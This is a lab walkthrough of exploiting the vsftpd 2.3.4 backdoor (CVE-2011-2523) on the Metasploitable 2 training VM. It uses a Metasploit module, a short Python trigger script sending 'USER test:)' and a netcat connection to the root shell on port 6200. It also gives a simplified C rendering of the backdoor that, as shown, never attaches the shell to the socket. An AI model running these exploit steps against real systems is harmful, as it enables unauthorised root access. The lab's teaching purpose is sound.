# Exploiting vsftpd 2.3.4 on Metasploitable 2

## 1. Environment Setup

### Requirements:
- **Attacker Machine:** Kali Linux / Parrot OS
- **Target Machine:** Metasploitable 2
- **Tools Used:** `nmap`, `netcat`, `python`, `Metasploit`

### Finding the Target IP
To identify the target's IP address, run:
```bash
sudo netdiscover -r 192.168.1.0/24
```
Or check directly on Metasploitable 2:
```bash
ifconfig
```
Example output:
```
inet addr: 192.168.1.100  Bcast:192.168.1.255  Mask:255.255.255.0
```

## 2. Scanning for Open Ports
Run an `nmap` scan to detect services:
```bash
sudo nmap -sV -p- 192.168.1.100
```
Example output:
```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
22/tcp   open  ssh        OpenSSH 4.7p1
23/tcp   open  telnet
80/tcp   open  http       Apache 2.2.8
```

## 3. Identifying Vulnerabilities
Search for known exploits for vsftpd 2.3.4:
```bash
searchsploit vsftpd 2.3.4
```
Expected output:
```
vsftpd 2.3.4 - Backdoor Command Execution
```

## 4. Exploiting vsftpd 2.3.4 with Metasploit
1. Start Metasploit:
```bash
msfconsole
```
2. Search for the exploit:
```bash
search vsftpd
```
3. Use the exploit module:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```
4. Set the target IP:
```bash
set RHOSTS 192.168.1.100
set RPORT 21
```
5. Run the exploit:
```bash
run
```
6. If successful, you will get a remote shell:
```bash
whoami
```
Expected output:
```
root
```

## 5. Exploiting vsftpd 2.3.4 Manually (Python Script)
Instead of using Metasploit, we can manually exploit the vulnerability using Python.

### **Exploit Code:**
```python
import socket

ip = "192.168.1.100"
port = 21

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
    s.connect((ip, port))  # Connect to the target's FTP server
    s.send(b"USER test:)\n")  # Send the malicious USER command
    s.send(b"PASS test\n")  # Send a dummy password to trigger the backdoor
    s.close()  # Close the connection

    print("[+] Exploit sent! Try connecting with netcat:")
    print(f"nc {ip} 6200")  # Inform the user to connect to the shell
except:
    print("[-] Connection failed.")
```

### **Explaining the Code:**
1. **`socket.socket(AF_INET, SOCK_STREAM)`** - Creates a TCP socket for communication.
2. **`s.connect((ip, port))`** - Connects to the FTP server on the target machine.
3. **`s.send(b"USER test:)\n")`** - Sends a crafted `USER` command containing `:)` which triggers the backdoor.
4. **`s.send(b"PASS test\n")`** - Sends a dummy password to complete the authentication.
5. **`s.close()`** - Closes the connection to allow the exploit to take effect.
6. **The exploit opens a shell on port 6200, and we use `nc` (Netcat) to connect manually.**

### **Execute the Exploit:**
```bash
python3 exploit_vsftpd.py
```

### **Connect to the Backdoor Shell:**
```bash
nc 192.168.1.100 6200
whoami
```
Expected output:
```
root
```

## 6. Understanding the Exploit
### **Vulnerability Type:**
- **Backdoor RCE (Remote Code Execution)**
- **CVE:** [CVE-2011-2523](https://www.cvedetails.com/cve/CVE-2011-2523/)

### **How the Exploit Works:**
1. The vulnerable **vsftpd 2.3.4** server has a hidden backdoor.
2. Sending `USER test:)` activates the backdoor, opening a shell on **port 6200**.
3. We connect to **port 6200** via `nc` and gain root access.

### **Extracted Malicious Code in vsftpd 2.3.4:**
```c
if (strstr(user_input, ":)")) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(6200);
    bind(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
    listen(sock, 1);
    accept(sock, NULL, NULL);
    execl("/bin/sh", "sh", NULL);
}
```
This creates a **hidden shell listener** on port 6200.

## 7. Conclusion
✅ Successfully exploited vsftpd 2.3.4 using both Metasploit and a Python script.
✅ Gained root access on Metasploitable 2.
✅ Learned how backdoor vulnerabilities can be inserted into software.

## 8. Next Steps
- Privilege Escalation on Metasploitable 2
- Automating the exploitation process
- Exploring other vulnerable services on Metasploitable 2

📌 **Ready for the next step?** 🚀

